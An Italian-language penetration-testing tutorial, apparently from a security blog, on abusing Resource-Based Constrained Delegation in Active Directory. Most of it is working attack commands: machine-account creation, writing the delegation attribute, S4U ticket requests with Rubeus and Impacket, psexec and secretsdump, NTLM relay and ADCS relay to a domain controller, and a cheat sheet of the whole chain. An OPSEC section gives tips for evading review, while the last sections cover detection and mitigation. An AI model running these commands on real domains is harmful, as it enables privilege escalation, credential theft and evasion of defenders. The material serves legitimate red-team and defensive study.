---
title: 'RBCD Attack : Resource-Based Constrained Delegation PrivEsc'
slug: rbcd
description: 'RBCD sfrutta write access su msDS-AllowedToActOnBehalfOfOtherIdentity per privilege escalation  su active directory . Guida con Impacket, Rubeus e NTLM relay.'
image: /resource-based-constrained-delegation-rbcd.webp
draft: false
date: 2026-07-12T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - rbcd
  - msds-allowedtoactonbehalfofotheridentity
  - s4u2proxy
  - s4u2self
---

# Resource-Based Constrained Delegation: Da GenericWrite a Domain Admin

RBCD sfrutta write access sull'attributo `msDS-AllowedToActOnBehalfOfOtherIdentity` di un computer target. Scrivi il SID di un account che controlli, poi usi S4U2Self + S4U2Proxy per ottenere un TGS come Administrator su quel computer — senza toccare krbtgt, senza DCSync diretto.

***

La Resource-Based Constrained Delegation (RBCD) è stata introdotta in Windows Server 2012 R2 e permette a un computer di dichiarare quali account possono autenticarsi per suo conto. L'attributo che controlla questo comportamento — `msDS-AllowedToActOnBehalfOfOtherIdentity` — è scrivibile da chiunque abbia `GenericWrite`, `GenericAll` o `WriteProperty` sull'oggetto computer target.

In un engagement, questo si traduce in: hai write access su `FILESERVER$` tramite un'ACL mal configurata → crei (o usi) un computer account → scrivi il suo SID nell'attributo del target → usi S4U per ottenere un ticket come Administrator su `FILESERVER`. Il Domain Controller esegue la delega come se fosse legittima, perché la policy è scritta direttamente sull'oggetto di destinazione.

> **Key Takeaway:** RBCD trasforma write access su un oggetto computer in esecuzione di codice come Administrator su quella macchina. È uno degli abusi ACL più comuni e produttivi in [Active Directory](https://hackita.it/articoli/active-directory).

Classificato da MITRE ATT\&CK come [T1134.001](https://attack.mitre.org/techniques/T1134/001/).

![Flow RBCD: GenericWrite, machine account, scrittura attributo, S4U, TGS come Administrator](data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgOTAwIDI2MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8cmVjdCB3aWR0aD0iOTAwIiBoZWlnaHQ9IjI2MCIgZmlsbD0iI2ZmZmZmZiIvPgogIDwhLS0gYm94IHN0eWxlIC0tPgogIDxnIGZvbnQtZmFtaWx5PSJtb25vc3BhY2UiIGZvbnQtc2l6ZT0iMTQiPgogICAgPHJlY3QgeD0iMTAiIHk9IjEwMCIgd2lkdGg9IjE1MCIgaGVpZ2h0PSI2MCIgZmlsbD0iI2ZmZmZmZiIgc3Ryb2tlPSIjMTExMTExIiBzdHJva2Utd2lkdGg9IjIiLz4KICAgIDx0ZXh0IHg9Ijg1IiB5PSIxMjUiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiMxMTExMTEiPkdlbmVyaWNXcml0ZTwvdGV4dD4KICAgIDx0ZXh0IHg9Ijg1IiB5PSIxNDUiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiMxMTExMTEiPnN1IFRBUkdFVCQ8L3RleHQ+CgogICAgPHJlY3QgeD0iMjAwIiB5PSIxMDAiIHdpZHRoPSIxNTAiIGhlaWdodD0iNjAiIGZpbGw9IiNmZmZmZmYiIHN0cm9rZT0iIzExMTExMSIgc3Ryb2tlLXdpZHRoPSIyIi8+CiAgICA8dGV4dCB4PSIyNzUiIHk9IjEyNSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzExMTExMSI+Q3JlYS91c2E8L3RleHQ+CiAgICA8dGV4dCB4PSIyNzUiIHk9IjE0NSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzExMTExMSI+RkFLRTAxJDwvdGV4dD4KCiAgICA8cmVjdCB4PSIzOTAiIHk9IjEwMCIgd2lkdGg9IjE4MCIgaGVpZ2h0PSI2MCIgZmlsbD0iI2ZmZmZmZiIgc3Ryb2tlPSIjZGMyNjI2IiBzdHJva2Utd2lkdGg9IjIiLz4KICAgIDx0ZXh0IHg9IjQ4MCIgeT0iMTIwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjZGMyNjI2Ij5TY3JpdmUgU0lEIEZBS0UwMSQ8L3RleHQ+CiAgICA8dGV4dCB4PSI0ODAiIHk9IjE0MCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iI2RjMjYyNiI+aW4gbXNEUy1BbGxvd2VkVG8uLi48L3RleHQ+CgogICAgPHJlY3QgeD0iNjEwIiB5PSIxMDAiIHdpZHRoPSIxMzAiIGhlaWdodD0iNjAiIGZpbGw9IiNmZmZmZmYiIHN0cm9rZT0iIzExMTExMSIgc3Ryb2tlLXdpZHRoPSIyIi8+CiAgICA8dGV4dCB4PSI2NzUiIHk9IjEyNSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzExMTExMSI+UzRVMlNlbGY8L3RleHQ+CiAgICA8dGV4dCB4PSI2NzUiIHk9IjE0NSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzExMTExMSI+KyBTNFUyUHJveHk8L3RleHQ+CgogICAgPHJlY3QgeD0iNzgwIiB5PSIxMDAiIHdpZHRoPSIxMTAiIGhlaWdodD0iNjAiIGZpbGw9IiNmZmZmZmYiIHN0cm9rZT0iI2RjMjYyNiIgc3Ryb2tlLXdpZHRoPSIyIi8+CiAgICA8dGV4dCB4PSI4MzUiIHk9IjEyNSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iI2RjMjYyNiI+VEdTIGNvbWU8L3RleHQ+CiAgICA8dGV4dCB4PSI4MzUiIHk9IjE0NSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iI2RjMjYyNiI+QWRtaW5pc3RyYXRvcjwvdGV4dD4KCiAgICA8IS0tIGFycm93cyAtLT4KICAgIDxsaW5lIHgxPSIxNjAiIHkxPSIxMzAiIHgyPSIxOTgiIHkyPSIxMzAiIHN0cm9rZT0iIzExMTExMSIgc3Ryb2tlLXdpZHRoPSIyIi8+CiAgICA8cG9seWdvbiBwb2ludHM9IjE5OCwxMzAgMTg4LDEyNSAxODgsMTM1IiBmaWxsPSIjMTExMTExIi8+CgogICAgPGxpbmUgeDE9IjM1MCIgeTE9IjEzMCIgeDI9IjM4OCIgeTI9IjEzMCIgc3Ryb2tlPSIjMTExMTExIiBzdHJva2Utd2lkdGg9IjIiLz4KICAgIDxwb2x5Z29uIHBvaW50cz0iMzg4LDEzMCAzNzgsMTI1IDM3OCwxMzUiIGZpbGw9IiMxMTExMTEiLz4KCiAgICA8bGluZSB4MT0iNTcwIiB5MT0iMTMwIiB4Mj0iNjA4IiB5Mj0iMTMwIiBzdHJva2U9IiMxMTExMTEiIHN0cm9rZS13aWR0aD0iMiIvPgogICAgPHBvbHlnb24gcG9pbnRzPSI2MDgsMTMwIDU5OCwxMjUgNTk4LDEzNSIgZmlsbD0iIzExMTExMSIvPgoKICAgIDxsaW5lIHgxPSI3NDAiIHkxPSIxMzAiIHgyPSI3NzgiIHkyPSIxMzAiIHN0cm9rZT0iIzExMTExMSIgc3Ryb2tlLXdpZHRoPSIyIi8+CiAgICA8cG9seWdvbiBwb2ludHM9Ijc3OCwxMzAgNzY4LDEyNSA3NjgsMTM1IiBmaWxsPSIjMTExMTExIi8+CiAgPC9nPgo8L3N2Zz4K)

***

## Come Funziona

Il meccanismo S4U (Service for User) di [Kerberos](https://hackita.it/articoli/kerberos) ha due estensioni:

* **S4U2Self:** un account con SPN può richiedere un TGS per se stesso impersonando qualsiasi utente — anche senza conoscerne la password. Il DC lo permette perché l'account fa la richiesta "per sé stesso", non sta chiedendo di autenticarsi come qualcun altro. Il ticket che ottieni ha come client Administrator, ma è marcato "forwardable" solo se il DC considera l'account chiamante idoneo alla delega
* **S4U2Proxy:** quel ticket forwardable può essere scambiato con il KDC per un secondo TGS, questa volta verso un servizio terzo (es. `cifs/TARGET`). Qui entra in gioco la delega: il KDC controlla se l'account chiamante è autorizzato a delegare verso quel servizio. Nella constrained delegation classica questo controllo guarda `msDS-AllowedToDelegateTo` sull'account sorgente; con RBCD guarda `msDS-AllowedToActOnBehalfOfOtherIdentity` sul target

Con RBCD è il **computer target** a dichiarare "mi fido di FAKE$, può agire per mio conto". Quando `FAKE$` esegue S4U2Self per ottenere un ticket come Administrator, e poi S4U2Proxy verso il target, il DC lo considera legittimo perché la policy di delega è scritta nell'attributo del target stesso — non serve toccare l'account sorgente.

S4U2Self richiede che l'account che lo esegue abbia almeno uno SPN registrato — per questo serve un machine account o un service account, non un utente normale senza SPN. E RBCD si configura esclusivamente su oggetti **computer**: l'attributo `msDS-AllowedToActOnBehalfOfOtherIdentity` non esiste sugli utenti.

**Attack flow:**

```
Write access su msDS-AllowedToActOnBehalfOfOtherIdentity del target
    ↓
Crea o usa un account con SPN sotto il tuo controllo (FAKE$)
    ↓
Scrivi il SID di FAKE$ nell'attributo del target
    ↓
S4U2Self: FAKE$ ottiene un TGS impersonando Administrator
    ↓
S4U2Proxy: scambia quel TGS per un TGS verso cifs/TARGET
    ↓
Accesso al target come Administrator
```

***

## Prerequisiti

* Write access su `msDS-AllowedToActOnBehalfOfOtherIdentity` del computer target — verificabile via [BloodHound](https://hackita.it/articoli/bloodhound) cercando l'edge `AllowedToAct` (oltre ai classici `GenericWrite`, `GenericAll`, `WriteProperty` verso oggetti computer)
* Un account con SPN sotto il tuo controllo. Il modo più semplice: creare un machine account — di default ogni utente di dominio può crearne fino a 10, controllato da `MachineAccountQuota` (MAQ)
* DC Windows Server 2012 R2 o superiore
* L'utente da impersonare deve esistere e non essere nel gruppo **Protected Users** o marcato "Account is sensitive and cannot be delegated"

***

## Step 1 — Crea (o Usa) un Account con SPN

Verifica prima quanti computer account puoi creare:

```bash
nxc ldap <DC_IP> -u utente -p Password123! -M maq
```

Crea il machine account fake:

```bash
# Linux — Impacket
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ssword123!' \
  -dc-ip <DC_IP> 'hackita.local/utente:Password123!'
```

```powershell
# Windows — PowerMad
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force)
```

Se hai già un account con SPN sotto controllo (service account, computer account esistente), puoi saltare questo step e usarlo direttamente.

***

## Step 2 — Scrivi FAKE01$ nell'Attributo del Target

Prima di scrivere, verifica se il target ha già una delega configurata — se la sovrascrivi senza salvarla, a fine engagement non sai cosa ripristinare:

```bash
impacket-rbcd -delegate-to 'TARGET$' -dc-ip <DC_IP> -action read 'hackita.local/utente:Password123!'
```

Se il read restituisce qualcosa, salvane l'output prima di procedere. Poi scrivi:

```bash
# Impacket — configura RBCD: TARGET$ si fida di FAKE01$
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' \
  -dc-ip <DC_IP> -action write 'hackita.local/utente:Password123!'
```

```powershell
# PowerView
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-XXXXXXXXXX-SID-OF-FAKE01)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-ADComputer TARGET | Set-ADComputer -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}

# Verifica
Get-ADComputer TARGET -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

***

## Step 3 — S4U Attack per il Ticket come Administrator

### Con Rubeus (Windows)

```powershell
# Calcola l'hash di FAKE01$
Rubeus.exe hash /password:P@ssword123! /user:FAKE01$ /domain:hackita.local

# S4U2Self + S4U2Proxy — TGS come Administrator su TARGET
Rubeus.exe s4u /user:FAKE01$ /rc4:<NTLM_HASH_FAKE01> /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.hackita.local /domain:hackita.local /ptt
```

Con AES256 (preferibile, meno rumore):

```powershell
Rubeus.exe s4u /user:FAKE01$ /aes256:<AES256_FAKE01> /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.hackita.local /domain:hackita.local /ptt
```

Ticket per più servizi in un colpo solo:

```powershell
Rubeus.exe s4u /user:FAKE01$ /rc4:<HASH> /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.hackita.local /altservice:krbtgt,cifs,host,http,winrm,ldap \
  /domain:hackita.local /ptt
```

### Con Impacket (Linux)

```bash
impacket-getST -spn cifs/TARGET.hackita.local -impersonate Administrator \
  -dc-ip <DC_IP> 'hackita.local/FAKE01$:P@ssword123!'

export KRB5CCNAME=Administrator@cifs_TARGET.hackita.local@CORP.LOCAL.ccache

impacket-psexec -k -no-pass hackita.local/Administrator@TARGET.hackita.local
impacket-secretsdump -k -no-pass hackita.local/Administrator@TARGET.hackita.local
```

***

## Step 4 — Accesso e Post-Exploitation

```powershell
dir \\TARGET.hackita.local\C$
dir \\TARGET.hackita.local\ADMIN$
.\PsExec.exe \\TARGET.hackita.local cmd.exe
```

Da lì puoi proseguire con [credential dumping](https://hackita.it/articoli/credential-dumping) sulla macchina target e continuare il movimento laterale.

***

## Vettore Alternativo: NTLM Relay → RBCD Automatico

Senza write access diretto, ma con la possibilità di coercire un'autenticazione NTLM, `ntlmrelayx` configura RBCD in automatico con `--delegate-access`: crea il computer account fake e scrive l'attributo in un solo comando.

**Prerequisiti:** LDAP signing non obbligatorio sul DC (default su Server 2022 e precedenti), MAQ > 0.

* LDAP signing obbligatorio → il relay verso LDAP semplice fallisce
* LDAPS senza channel binding (EPA disattivato) → il relay resta possibile anche con signing attivo, perché passa da LDAPS invece che da LDAP in chiaro

```bash
# Relay verso LDAPS del DC
impacket-ntlmrelayx -t ldaps://<DC_IP> -smb2support --delegate-access \
  --no-dump --no-da --no-acl --no-validate-privs

# Coercizione (PetitPotam, PrintSpooler, Responder, WebDAV)
# Al momento dell'autenticazione, ntlmrelayx crea un computer account random
# (es. KQCLXPVT$) e configura RBCD sul target automaticamente

# Ticket come Administrator con l'account creato
impacket-getST -spn cifs/TARGET.hackita.local -impersonate Administrator \
  -dc-ip <DC_IP> 'hackita.local/KQCLXPVT$:<password_generata>'

export KRB5CCNAME=Administrator@cifs_TARGET.hackita.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass hackita.local/Administrator@TARGET.hackita.local
```

Particolarmente efficace con coercizione via WebDAV (WebClient attivo sul target), perché forza un'autenticazione HTTP relayata verso LDAPS senza dover bypassare l'SMB signing.

***

## RBCD su un Domain Controller → DCSync

Write access diretto sul computer account di un DC è raro — nella pratica il vettore standard passa da ADCS. Se il DC ha un template HTTP enrollment vulnerabile, il relay verso l'endpoint di certificati apre una shell LDAP con cui configurare RBCD direttamente sul DC:

```bash
# Relay dell'autenticazione coercita verso l'endpoint ADCS del DC
certipy relay -ca CA-IP -template DomainController

# Nella shell LDAP ottenuta, configura RBCD sul DC
set_rbcd DC01$ FAKE01$
```

Dopo la configurazione, il flow è identico a quello standard:

```bash
impacket-getST -spn cifs/DC01.hackita.local -impersonate Administrator \
  -dc-ip <DC_IP> 'hackita.local/FAKE01$:P@ssword123!'

export KRB5CCNAME=Administrator@cifs_DC01.hackita.local@CORP.LOCAL.ccache

impacket-secretsdump -k -no-pass hackita.local/Administrator@DC01.hackita.local
```

Se invece hai già write access diretto sul computer object del DC (raro, ma capita con ACL legacy):

```bash
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'DC01$' \
  -dc-ip <DC_IP> -action write 'hackita.local/utente:Password123!'
```

Poi [DCSync](https://hackita.it/articoli/dcsync) come sopra.

***

## Chaining RBCD — Doppio Hop Senza Accesso Diretto

Se hai compromesso `ServiceA` e vuoi arrivare a `ServiceC`, ma `ServiceB` (l'intermediario) può delegare verso `ServiceC` senza protocol transition, puoi concatenare due RBCD:

1. Configuri RBCD da `ServiceA` verso `ServiceB`
2. Fai un S4U completo e ottieni un service ticket forwardable come Administrator verso `ServiceB`
3. Riusi quel ticket forwardable per fare S4U2Proxy da `ServiceB` verso `ServiceC` — visto che il ticket non è vincolato al servizio, puoi cambiarne lo SPN (es. da `time/ServiceC` a `cifs/ServiceC`)

Utile quando hai `GenericWrite` solo su un nodo intermedio della catena di delega e non sul target finale.

***

## RBCD Cross-Domain / Cross-Forest

RBCD funziona anche attraverso un trust: un computer in un dominio/foresta può fidarsi di un account che vive in un dominio diverso, purché il trust lo permetta. Il meccanismo S4U2Self/S4U2Proxy resta lo stesso, ma serve tenere conto di:

* Il SID dell'account delegante deve essere risolvibile attraverso il trust (niente SID filtering che lo blocchi)
* Il TGS intermedio attraversa il trust — servono i referral Kerberos corretti tra i due domini

È uno scenario avanzato, tipico di ambienti multi-forest con trust bidirezionali mal configurati — Impacket ha un branch dedicato (`cross_forest_rbcd`) per gestire questi referral automaticamente.

***

## Se MachineAccountQuota = 0

Se non puoi creare computer account come utente normale, hai comunque quattro alternative:

1. **Usa un computer account già compromesso** come `delegate-from`, se ne hai le credenziali
2. **Aggiungi un SPN a un account esistente** su cui hai `GenericWrite`, e usalo come sorgente della delega
3. **RBCD da un account SPN-less** — anche un utente senza SPN può essere usato come `delegate-from` in alcuni scenari (utile quando non c'è ADCS con endpoint HTTP e Shadow Credentials non è applicabile, es. domain functional level basso)
4. **Shadow Credentials** al posto di RBCD — con `GenericWrite` su un utente puoi scrivere `msDS-KeyCredentialLink` e ottenere l'NT hash via PKINIT, senza bisogno di MAQ:

```bash
certipy shadow auto -u attacker@hackita.local -p Pass -account targetuser -dc-ip <DC_IP>
```

***

## Errori Comuni

| Errore                 | Significato                                                                                                        |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------ |
| `KDC_ERR_BADOPTION`    | utente da impersonare non delegabile (Protected Users o "sensitive and cannot be delegated")                       |
| `KRB_AP_ERR_MODIFIED`  | SPN sbagliato o non corrispondente a quello registrato sul target                                                  |
| `STATUS_ACCESS_DENIED` | ticket ottenuto correttamente ma servizio/porta non giusti sul target                                              |
| `INSUFF_ACCESS_RIGHTS` | non hai davvero `GenericWrite`/`GenericAll` sul computer target — verifica l'ACL con BloodHound prima di riprovare |

***

## Cheat Sheet

| Step                             | Comando                                                                                                                 |
| -------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| Verifica MAQ                     | `nxc ldap <DC> -u user -p Pass -M maq`                                                                                  |
| Crea computer account (Linux)    | `impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123!' -dc-ip <DC> 'hackita.local/user:Pass'`         |
| Crea computer account (Windows)  | `New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force)`           |
| Configura RBCD (Linux)           | `impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -dc-ip <DC> -action write 'hackita.local/user:Pass'`     |
| Configura RBCD (PowerView)       | `Set-ADComputer TARGET -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}`                                 |
| S4U → ticket come Administrator  | `impacket-getST -spn cifs/TARGET.hackita.local -impersonate Administrator -dc-ip <DC> 'hackita.local/FAKE01$:P@ss123!'` |
| S4U con Rubeus                   | `Rubeus.exe s4u /user:FAKE01$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/TARGET.hackita.local /ptt`       |
| Usa il ticket                    | `export KRB5CCNAME=Administrator@cifs_TARGET.hackita.local@CORP.LOCAL.ccache`                                           |
| Esegui come Administrator        | `impacket-psexec -k -no-pass hackita.local/Administrator@TARGET.hackita.local`                                          |
| Verifica RBCD configurato        | `impacket-rbcd -delegate-to 'TARGET$' -dc-ip <DC> -action read 'hackita.local/user:Pass'`                               |
| Cleanup RBCD                     | `impacket-rbcd -delegate-to 'TARGET$' -dc-ip <DC> -action flush 'hackita.local/user:Pass'`                              |
| RBCD su DC → DCSync              | `impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'DC01$' -dc-ip <DC> -action write 'hackita.local/user:Pass'`       |
| Relay ADCS → RBCD su DC          | `certipy relay -ca CA-IP -template DomainController`                                                                    |
| Shadow Credentials (alternativa) | `certipy shadow auto -u attacker@hackita.local -p Pass -account targetuser -dc-ip <DC>`                                 |

**Tool alternativi:** oltre a Impacket e Rubeus, RBCD si può configurare anche con **NetExec** (`nxc ldap <DC> -M rbcd`) e **BloodyAD** (`bloodyAD --host <DC> -u user -p Pass set object TARGET$ msDS-AllowedToActOnBehalfOfOtherIdentity -v FAKE01$`).

***

## OPSEC

* Preferisci **AES256** a RC4 per il S4U attack — meno anomalie in ambienti moderni
* Il computer account creato (`FAKE01$`) rimane in AD dopo l'attacco — rimuovilo a fine engagement per non lasciare artefatti
* `msDS-AllowedToActOnBehalfOfOtherIdentity` modificato è il segnale principale — ripristina l'attributo originale con `-action flush`
* **Attenzione:** `flush` elimina **tutte** le ACE nell'attributo, non solo quella che hai aggiunto tu. Se il target aveva già una delega legittima preesistente, `flush` la cancella insieme alla tua — da qui l'importanza del `-action read` fatto prima allo Step 2
* Utenti in **Protected Users** o con "Account is sensitive and cannot be delegated" non sono impersonabili via S4U — scegli il target di impersonation di conseguenza
* Evita nomi come `FAKE01$` per il computer account — un naming coerente con la convenzione del dominio (es. simile a workstation/server esistenti) attira meno attenzione in una revisione manuale

***

## Scenario Reale

BloodHound mostra che il tuo account compromesso ha `GenericWrite` su `FILESERVER$`. Non hai accesso diretto al file server ma vuoi arrivarci:

1. Verifichi che `MachineAccountQuota` > 0 (default: 10)
2. Crei `FAKE01$` con `impacket-addcomputer`
3. Scrivi il SID di `FAKE01$` in `msDS-AllowedToActOnBehalfOfOtherIdentity` di `FILESERVER$`
4. Esegui S4U con `impacket-getST` impersonando Administrator
5. Accedi a `\\FILESERVER\C$` come Administrator
6. Rimuovi `FAKE01$` e ripristini l'attributo

Tutto il flow richiede solo credenziali di un normale utente di dominio — nessun privilegio elevato, nessun accesso al DC.

***

## Detection

**🔴 HIGH:**

* **Event ID 5136** — modifica a `msDS-AllowedToActOnBehalfOfOtherIdentity` su un oggetto computer (richiede Directory Service Changes auditing)
* **Event ID 4741** — creazione di un nuovo computer account, specialmente da account non amministrativi

**🟡 MEDIUM:**

* **Event ID 4769** — richieste S4U2Self/S4U2Proxy anomale (ticket per un utente diverso dal richiedente)
* Computer account creati da utenti normali (anomalo rispetto al baseline)
* Modifiche a `msDS-AllowedToActOnBehalfOfOtherIdentity` seguite a breve da autenticazioni S4U

***

## Mitigazione

* Impostare **MachineAccountQuota a 0** (`ms-DS-MachineAccountQuota` sul dominio) — impedisce agli utenti normali di creare computer account
* Abilitare auditing **Directory Service Changes** per rilevare modifiche a `msDS-AllowedToActOnBehalfOfOtherIdentity`
* Aggiungere gli account privilegiati al **Protected Users Security Group** — non delegabili via S4U
* Flaggare gli account sensibili con "**Account is sensitive and cannot be delegated**" in ADUC
* Revisionare con [BloodHound](https://hackita.it/articoli/bloodhound) tutti gli edge `GenericWrite`/`GenericAll` verso oggetti computer ed eliminarli dove non necessari

***

## FAQ

**Devo per forza creare un computer account?**
No. Se controlli già un account con SPN (service account, computer account esistente) puoi usarlo direttamente. Il computer account nuovo serve solo quando non ne hai già uno disponibile.

**MachineAccountQuota a 0 blocca completamente l'attacco?**
Blocca solo il vettore "crea un computer account fake". Con un account con SPN già in mano, o un service account compromesso, l'attacco resta possibile.

**L'utente impersonato deve esistere?**
Sì, a differenza del Silver Ticket. S4U2Self richiede che l'account da impersonare esista nel dominio e non abbia "Account is sensitive and cannot be delegated" abilitato.

***

## Conclusione

RBCD è uno degli abusi ACL più efficaci in Active Directory perché trasforma un permesso apparentemente innocuo — `GenericWrite` su un oggetto computer — in esecuzione di codice come Administrator su quella macchina. In ambienti enterprise con deleghe legacy mai revisionate, questo path è estremamente comune.

La difesa richiede tre cose in parallelo: MachineAccountQuota a 0, auditing su `msDS-AllowedToActOnBehalfOfOtherIdentity`, e una revisione sistematica degli edge ACL tramite [BloodHound](https://hackita.it/articoli/bloodhound) per eliminare i `GenericWrite` non giustificati su oggetti computer.

***

## Collegati a

* [Active Directory](https://hackita.it/articoli/active-directory)
* [Kerberos](https://hackita.it/articoli/kerberos)
* [BloodHound](https://hackita.it/articoli/bloodhound)
* [DCSync](https://hackita.it/articoli/dcsync)
* [Credential Dumping](https://hackita.it/articoli/credential-dumping)

**Risorse esterne:**

* [MITRE ATT\&CK – T1134.001](https://attack.mitre.org/techniques/T1134/001/)
* [Elad Shamir – Wagging the Dog: Abusing RBCD to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [SpecterOps – A Case Study in Wagging the Dog: Computer Takeover](https://specterops.io/blog/2019/02/28/a-case-study-in-wagging-the-dog-computer-takeover/)
* [HackTricks – Resource-Based Constrained Delegation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html)
